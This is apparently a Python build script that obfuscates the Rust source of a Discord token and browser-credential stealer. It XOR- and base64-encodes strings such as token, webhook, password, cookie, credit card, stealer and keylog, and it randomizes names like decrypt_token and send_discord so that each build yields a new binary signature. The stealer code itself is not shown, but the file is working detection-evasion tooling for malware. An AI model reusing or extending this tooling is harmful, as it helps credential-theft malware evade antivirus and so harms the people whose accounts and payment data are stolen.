#!/usr/bin/env python3
"""
Source code obfuscator - Randomizes all function/variable names and obfuscates strings
Runs at compile time to generate unique binary signatures every build.
"""
import os
import re
import random
import string
import hashlib
import base64
from typing import Dict, Tuple

SENSITIVE_PATTERNS = [
    'discord', 'Discord', 'token', 'Token', 'password', 'Password',
    'webhook', 'Webhook', 'account', 'Account', 'friend', 'Friend',
    'emotet', 'Emotet', 'trojan', 'Trojan', 'banker', 'Banker',
    'inject', 'Inject', 'shellcode', 'Shellcode', 'stealer', 'Stealer',
    'keylog', 'Keylog', 'hook', 'Hook',
]

SQL_PATTERNS = [
    'password', 'login', 'cookie', 'history', 'credit', 'card',
]

URL_PATTERNS = [
    'discord', 'api', 'cdn', 'github',
]

FUNCTION_PATTERNS = [
    'fetch_discord', 'decrypt', 'encrypt', 'get_webhook', 'get_api',
    'get_discord', 'badge', 'show_loading', 'press_any_key',
    'get_hostname', 'get_username', 'decrypt_master', 'decrypt_token',
    'get_discord_paths', 'send_discord', 'build_payload',
]

VARIABLE_PATTERNS = [
    'discord_accounts', 'discord_paths', 'webhook_url', 'api_url',
    'discord_friends', 'discord_content', 'embed_description',
    'sent_tokens', 'badges_display', 'master_key', 'enc_key',
]

def generate_random_name(length=12) -> str:
    """Generate a random alphanumeric name"""
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def generate_xor_key() -> int:
    """Generate a random XOR key for string obfuscation"""
    return random.randint(1, 254)

def xor_bytes(data: bytes, key: int) -> bytes:
    """XOR encode bytes with a single-byte key"""
    return bytes(b ^ key for b in data)

def obfuscate_string(s: str, key: int) -> Tuple[str, int]:
    """Obfuscate a string and return (encoded_str, key)"""
    encoded = xor_bytes(s.encode('utf-8'), key)
    return base64.b64encode(encoded).decode('ascii'), key

def build_name_mapping() -> Dict[str, str]:
    """Build a mapping of original names to random names"""
    mapping = {}

    for pattern in FUNCTION_PATTERNS:
        original = pattern
        random_name = generate_random_name(15)
        mapping[original] = random_name

    for pattern in VARIABLE_PATTERNS:
        original = pattern
        random_name = generate_random_name(12)
        mapping[original] = random_name

    return mapping

def obfuscate_sql_query(query: str, key: int) -> str:
    """Obfuscate SQL query by building it character by character"""
    chars = [f"(0x{(ord(c) ^ key):02x})" if c not in ' \'"()' else f"'{c}'" for c in query]
    return ' + '.join(chars)

def process_source_file(filepath: str, name_mapping: Dict[str, str], xor_key: int) -> str:
    """Process a Rust source file and obfuscate sensitive content"""
    with open(filepath, 'r', encoding='utf-8') as f:
        content = f.read()

    original_content = content

    for sensitive in SENSITIVE_PATTERNS:
        if sensitive.lower() in content.lower():
            encoded, k = obfuscate_string(sensitive, xor_key)
            content = content.replace(f'"{sensitive}"', f'r#"{encoded}"#')
            content = content.replace(f"'{sensitive}'", f"r#'{encoded}'#")

    for sql in SQL_PATTERNS:
        if sql in content.lower():
            encoded, k = obfuscate_string(sql, xor_key)
            content = content.replace(f'"{sql}"', f'r#"{encoded}"#')
            content = content.replace(f"'{sql}'", f"r#'{encoded}'#")

    for url in URL_PATTERNS:
        if url in content.lower():
            encoded, k = obfuscate_string(url, xor_key)
            content = content.replace(f'"{url}"', f'r#"{encoded}"#')
            content = content.replace(f"'{url}'", f"r#'{encoded}'#")

    func_pattern = r'\b(f[a-z_]+)\s*\('
    def replace_func(match):
        func_name = match.group(1)
        for original, random_name in name_mapping.items():
            if func_name.lower() == original.lower():
                return random_name + '('
        return match.group(0)

    for original, random_name in name_mapping.items():
        escaped = re.escape(original)
        content = re.sub(rf'\b{escaped}\b', random_name, content, flags=re.IGNORECASE)

    if content != original_content:
        print(f"[*] Obfuscated {filepath}")

    return content

def create_obfuscated_rs(output_path: str, name_mapping: Dict[str, str], xor_key: int):
    """Create the obfuscated runtime string deobfuscator module"""

    decoder_funcs = []
    for i, pattern in enumerate(SENSITIVE_PATTERNS[:20]):
        encoded, _ = obfuscate_string(pattern, xor_key)
        decoder_funcs.append(f'''
#[allow(dead_code)]
pub fn s_{i}() -> String {{
    let encoded = "{encoded}";
    let key = {xor_key};
    let decoded = base64::decode(encoded).unwrap();
    String::from_utf8(xor_bytes(&decoded, key)).unwrap()
}}''')

    content = f'''
// AUTO-OBFUSCATED STRINGS - Generated at build time
// DO NOT EDIT MANUALLY

use base64::{{Engine, engine::general_purpose::STANDARD}};

fn xor_bytes(data: &[u8], key: u8) -> Vec<u8> {{
    data.iter().map(|b| b ^ key).collect()
}}

{' '.join(decoder_funcs)}

#[allow(dead_code)]
pub fn decode_static(encoded: &str, key: u8) -> String {{
    let decoded = STANDARD.decode(encoded).unwrap();
    String::from_utf8(xor_bytes(&decoded, key)).unwrap()
}}
'''

    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(content)

    print(f"[*] Created obfuscated strings module: {output_path}")

def main():
    import argparse
    parser = argparse.ArgumentParser(description='Obfuscate Rust source code')
    parser.add_argument('--input', required=True, help='Input .rs file')
    parser.add_argument('--output', required=True, help='Output .rs file')
    parser.add_argument('--key', type=int, required=True, help='XOR key')
    args = parser.parse_args()

    name_mapping = build_name_mapping()
    content = process_source_file(args.input, name_mapping, args.key)

    with open(args.output, 'w', encoding='utf-8') as f:
        f.write(content)

    print(f"[*] Output written to {args.output}")

if __name__ == '__main__':
    main()
